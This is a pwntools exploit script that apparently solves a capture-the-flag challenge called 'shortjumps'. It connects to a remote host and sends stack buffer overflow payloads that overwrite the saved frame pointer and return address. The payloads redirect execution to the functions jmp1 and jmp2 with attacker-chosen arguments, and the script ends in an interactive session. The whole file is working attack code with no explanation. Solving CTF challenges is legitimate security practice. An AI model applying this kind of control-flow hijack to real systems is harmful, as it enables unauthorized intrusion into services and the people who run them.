from pwn import *

exe = context.binary = ELF('./shortjumps', checksec=False)
# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x08049465
#            b*0x08049492
#            ''')

r = remote('146.190.115.228', 9993)

name = b'a'*31
ret = 0x0804900e
r.sendlineafter(b'> ', name)
r.sendlineafter(b'> ', b'')

payload = b'a'*120 + p32(0x0804c000 + 0x100) + p32(exe.sym['jmp1']) + p32(exe.sym['main']) + p32(0xdeadbeef)
r.sendlineafter(b'> ', payload)

r.sendlineafter(b'> ', name)
r.sendlineafter(b'> ', b'')

payload = b'\x00'*120 + p32(0x0804c000 + 0x100) + p32(exe.sym['jmp2']) + p32(exe.sym['main']) + p32(0xcafebabe) + p32(0x48385879)
r.sendlineafter(b'> ', payload)

r.interactive()